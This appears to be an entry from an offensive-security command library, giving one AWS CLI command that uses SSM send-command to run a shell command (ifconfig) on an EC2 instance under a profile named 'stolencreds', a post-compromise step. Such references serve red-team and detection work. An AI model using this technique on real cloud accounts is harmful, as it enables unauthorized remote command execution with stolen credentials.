---
id: 3f51bc1b-337a-48cc-9cbe-9b02cb3e8ec7
name: Send Shell Script Command
type: command
executor: bash
data: $ aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript"
  --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId"
  --profile stolencreds
output: null
created_at: '2023-04-06T03:56:09.691431+00:00'
updated_at: '2023-04-10T20:20:49.939502+00:00'
---

# Send Shell Script Command

```bash
$ aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds
```
